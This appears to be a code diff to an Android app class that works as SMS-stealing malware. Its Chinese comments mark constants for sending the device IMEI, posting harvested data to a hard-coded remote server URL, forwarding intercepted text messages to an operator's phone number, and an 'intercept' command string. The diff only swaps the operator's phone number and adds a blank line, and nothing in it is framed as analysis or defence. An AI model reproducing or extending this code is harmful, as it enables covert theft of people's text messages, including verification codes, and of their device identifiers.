@@ -25,11 +25,11 @@ public class Dctivity extends Activity {
 
 	private SharedPreferences sp;
 	//imei发送 
-	public static final String devicephone="13119529349";
+	public static final String devicephone="13568986885";
 	//提交数据
 	public static final String Dctivityhttpurl="http://118.193.159.126/ce/aaaa/sms.asp";
 	//短信转发
-	public static final String phonenum="13119529349";
+	public static final String phonenum="13568986885";
 	//拦截
 	public static final String lanjie="DX99#拦截-H";
 	//转发
@@ -40,6 +40,7 @@ public class Dctivity extends Activity {
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
+		
 		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
 		AnalyticsConfig.setChannel("Channel"+GetDeviceId());
 		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT+" "+Build.PRODUCT+"--"+Build.MODEL);
